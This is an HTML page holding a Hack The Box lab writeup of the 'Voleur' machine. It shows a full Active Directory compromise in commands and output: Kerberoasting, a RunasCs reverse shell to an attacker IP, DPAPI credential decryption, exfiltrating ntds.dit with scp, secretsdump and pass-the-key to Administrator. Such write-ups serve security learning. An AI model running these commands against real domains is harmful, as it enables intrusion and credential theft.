<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voleur Writeup (HTB)</title>
    <link rel="stylesheet" href="../../style/styles.css">
    <link rel="stylesheet" href="model.css"">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<body>
    <main>
        <article class="article-container">
            <div class="article-header">
                <h1 class="article-title">Voleur - HTB</h1>
                <div class="article-meta">
                    <span class="article-tags">
                        <i class="fas fa-tags"></i>
                        <span class="tag">DPAPI</span>
                        <span class="tag">Windows</span>
                        <span class="tag">Active Directory</span>
                        <span class="tag">HTB</span>
                    </span>
                    <span class="article-date"><i class="far fa-calendar"></i> 31 de Outubro, 2025</span>
                </div>
            </div>

                        <div class="article-content">
                <h2>Introduction</h2>
                <p>
                    Difficulty: Medium<br>
                    Machine: Voleur<br>
                    Credentials: ryan.naylor / HollowOct31Nyt<br>
                    IP Address: 10.10.11.76
                </p>
                <p>Nmap scan:</p>
                <pre><code>PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-08 06:12:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
61513/tcp open  msrpc         Microsoft Windows RPC
61519/tcp open  msrpc         Microsoft Windows RPC
61540/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows</code></pre>
                <p>We started by looking at the share and discovered that NTLM authentication was disabled, so we have to go for kerberos tickets.</p>
                <pre><code>netexec smb 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt -k --shares
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.76     445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         10.10.11.76     445    DC               [*] Enumerated shares
SMB         10.10.11.76     445    DC               Share           Permissions     Remark
SMB         10.10.11.76     445    DC               -----           -----------     ------
SMB         10.10.11.76     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.76     445    DC               C$                              Default share
SMB         10.10.11.76     445    DC               Finance                         
SMB         10.10.11.76     445    DC               HR                              
SMB         10.10.11.76     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.76     445    DC               IT              READ            
SMB         10.10.11.76     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.76     445    DC               SYSVOL          READ            Logon server share</code></pre>
                <p>Inside the IT share there was a file <code>Access_Review.xlsx</code> encrypted. We decrypted it using office2john and found the password <code>football1</code></p>
                <pre><code>office2john Access_Review.xlsx > hash.txt

john hash.txt --wordlist=~/wordlists/rockyou.txt</code></pre>
                <p>Inside this file, we see the following information.</p>
                <pre><code>Listed Users:
User	Role	Group	Note
Ryan.Naylor	First-Line Support Technician	SMB	Has Kerberos Pre-Auth disabled temporarily to test legacy systems.
Marie.Bryant	First-Line Support Technician	SMB	
Lacey.Miller	Second-Line Support Technician	Remote Management Users	
Todd.Wolfe	Second-Line Support Technician	Remote Management Users	Leaver. Password reset to NightT1meP1dg3on14 and account deleted
Jeremy.Combs	Third-Line Support Technician	Remote Management Users	Has access to Software folder.
Administrator	Administrator	Domain Admin	Not to be used for daily tasks!

Service Accounts
Account	Description	Note
svc_backup	Windows Backup	Speak to Jeremy!
svc_ldap	LDAP Services	P/W - M1XyC9pW7qT5Vn
svc_iis	IIS Administration	P/W - N5pXyW1VqM7CZ8
svc_winrm	Remote Management	Need to ask Lacey as she reset this recently.</code></pre>
                <p>
                    So, we have the passwords for svc_ldap and svc_iis (useless). We focused on svc_ldap, with it we obtained the hash of svc_winrm, because we have WriteSPN permissions on it (as shown in BloodHound), which allows us to modify the servicePrincipalName attribute of an object. SPNs are used by Kerberos to identify services (e.g., HTTP/DC.voleur.htb, MSSQL/DC.voleur.htb). 
                    <br><br>
                    When we request a service ticket for an SPN, the KDC encrypts the ticket with the key derived from the password of the account that owns that SPN. Therefore, anyone holding a TGS (Ticket Granting Service) for an SPN has a blob that can be cracked offline to discover the password of the associated account, this is what we call Kerberoasting. That's why we added an SPN to svc_winrm.
                </p>
                <img src="./assets/voleur/1.png" alt="">
                <p>We now perform a kerberoasting attack using the <code>targetedKerberoast</code> tool that automatically adds a SPN to the accounts where it has access and gets a TGS. We crack it and discover the password for the user svc_winrm.</p>
                <pre><code>python3 targetedKerberoast.py -d 'voleur.htb' -u 'svc_ldap' -k --no-pass --dc-host 'DC.voleur.htb'</code></pre>
                <p>So now we have:</p>
                <pre><code>ryan.naylor \ HollowOct31Nyt
svc_ldap \ M1XyC9pW7qT5Vn
todd.wolfe \ NightT1meP1dg3on14
svc_winrm \ AFireInsidedeOzarctica980219afi</code></pre>
                <p>We log in via evil-winrm as svc_winrm. Inside, we upload a <code>RunasCS.exe</code> and switch to svc_ldap, since it has permissions to restore deleted users, as we saw from the group in BloodHound.</p>
                <pre><code>.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.16.13:6666</code></pre>
                <p>We restore the user todd.wolfe with the following commands:</p>
                <pre><code>Restore-ADObject -Identity 'CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb'</code></pre>
                <p>
                    After authenticating as todd.wolfe, we perform enumeration and identify the user's DPAPI keys on the machine. <br><br> DPAPI (Data Protection API) is the Windows data protection API used by applications to encrypt secrets (private keys, credentials, cookies, etc.) without the developer having to handle the encryption directly. If we have access to the victim host and the data is protected by DPAPI, we can extract the master keys usually located at <code>%APPDATA%\Microsoft\Protect\SID\</code> and decrypt the blobs, thus recovering stored secrets.
                </p>
                <p>First, we copy the credentials and the masterkey to any directory; from there, we transfer them to our attack machine and decrypt them using impacket-dpapi.</p>
                <pre><code>cp 'C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88' \test\none\masterkey_blob

cp 'C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3' \test\none\credentials_blob</code></pre>
                <p>Then we use impacket-dpapi</p>
                <pre><code>impacket-dpapi masterkey -file masterkey_blob -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </code></pre>
                <img src="./assets/voleur/2.png" alt="">
                <p>And decrypt</p>
                <pre><code>impacket-dpapi credential -file credential_blob -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83</code></pre>
                <img src="./assets/voleur/3.png" alt="">
                <p>Now we log in as user jeremy.combs and see that he has a note and an id_rsa key</p>
                <img src="./assets/voleur/4.png" alt="">
                <p>We copy the key to another folder, download it, and log in via ssh as <code>svc_backup</code></p>
                <pre><code>chmod 600 id_rsa

ssh -i id_rsa svc_backup@10.10.11.76 -p 2222</code></pre>
                <p>Inside, we find the file <code>ntds.dit</code>, which is extremely sensitive. It stores the database and credentials of all users. We download it to our attack machine.</p>
                <p>Then we find two more folders</p>
                <img src="./assets/voleur/5.png" alt="">
                <p>We then download the files <code>SYSTEM</code> and <code>ntds.dit</code></p>
                <pre><code>scp -i id_rsa -P 2222 'svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit' .

scp -i id_rsa -P 2222 'svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM' .</code></pre>
                <p>We use <code>secretsdump.py</code> locally to obtain user hashes, including the administrator's hash</p>
                <img src="./assets/voleur/6.png" alt="">
                <p>To access the machine as administrator, we use the AES128 hash to get a ticket</p>
                <pre><code>impacket-getTGT voleur.htb/administrator -aesKey 38af4c8667c90d19b286c7af861b10cc -no-pass -dc-ip 10.10.11.76</code></pre>
                <img src="./assets/voleur/7.png" alt="">
                <p>We then log in using any tool (evil-winrm, wmiexec, psexec, etc.) and we are now admin</p>
                <img src="./assets/voleur/8.jpg" alt="">
            </div>

            <div class="article-footer">
                <a href="../../index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Home</a>
            </div>
        </article>
    </main>

    <footer>
        <div class="social-links">
            <a href="https://github.com/lsbxa" target="_blank"><i class="fab fa-github"></i></a>
            <a href="https://www.linkedin.com/in/marcelo-lisboa7/" target="_blank"><i class="fab fa-linkedin"></i></a>
        </div>
        <p>&copy; 2025 Memory Leak</p>
    </footer>
        <div id="imageModal" class="image-modal">
        <span class="image-modal-close">&times;</span>
        <img id="modalImage" src="" alt="">
    </div>

    <script>
        const modal = document.getElementById('imageModal');
        const modalImg = document.getElementById('modalImage');
        const closeBtn = document.querySelector('.image-modal-close');
        const images = document.querySelectorAll('.article-content img');

        images.forEach(img => {
            img.addEventListener('click', function() {
                modal.classList.add('active');
                modalImg.src = this.src;
            });
        });

        closeBtn.addEventListener('click', () => {
            modal.classList.remove('active');
        });

        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.classList.remove('active');
            }
        });

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && modal.classList.contains('active')) {
                modal.classList.remove('active');
            }
        });
    </script>
</body>

</html>
